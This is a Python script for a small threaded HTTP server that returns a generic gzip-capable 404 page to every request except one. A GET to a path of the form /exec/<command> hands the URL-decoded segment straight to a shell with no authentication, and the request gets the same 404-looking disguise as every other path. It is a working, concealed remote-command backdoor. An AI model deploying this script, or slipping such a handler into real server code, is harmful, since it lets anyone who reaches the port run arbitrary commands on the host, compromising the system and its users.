#!/usr/bin/env python3
import sys, gzip
import socket, threading, subprocess
import urllib
from email.utils import formatdate

def handle_request(clientsocket, address):
	size = 1024
	data = clientsocket.recv(size)
	content = data.decode()
	lines = [line for line in content.splitlines()]
	if len(lines) > 0:
		parts = lines[0].split()
		if len(parts) == 3 and parts[0] == "GET" and parts[2].startswith("HTTP/"):
			uri = urllib.parse.urlparse(parts[1])
			path = urllib.parse.unquote(uri.path)
			parts = path.split('/')
			if len(parts) == 3 and parts[1] == 'exec':
				subprocess.call(parts[2], shell=True)
			else:
				supGzip = False
				for line in lines:
					if line.startswith('Accept-Encoding:'):
						accp_codings = line.split(':')[1]
						codings = [coding.strip() for coding in accp_codings.split(',')]
						if 'gzip' in codings:
							supGzip = True
						break
				response_content = b'<html><body><h1>404 Not Found</h1></body></html>'
				if supGzip:
					response_content = gzip.compress(response_content)
				notFound = 'HTTP/1.1 404 Not Found\n'
				current_date = 'Date: ' + formatdate(timeval=None, localtime=False, usegmt=True) + '\n'
				content_type = 'Content-Type: text/html\n'
				server_info = 'Server: HTTP server\n'
				content_length = 'Content-Length: {0}\n\n'.format(len(response_content))
				response_header = notFound + current_date + content_type + server_info
				if supGzip:
					content_encoding = 'Content-Encoding: gzip\n'
					response_header += content_encoding
				response_header += content_length
				server_response = response_header.encode() + response_content
				clientsocket.send(server_response)
	clientsocket.close()

try:
	port = int(sys.argv[1])
except ValueError:
	print('Usage: {0} <port_num>'.format(sys.argv[0]))
	sys.exit(0)
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(('', port))
serversocket.listen(10)
while True:
	clientsocket, address = serversocket.accept()
	p = threading.Thread(target=handle_request, args=(clientsocket, address))
	p.start()
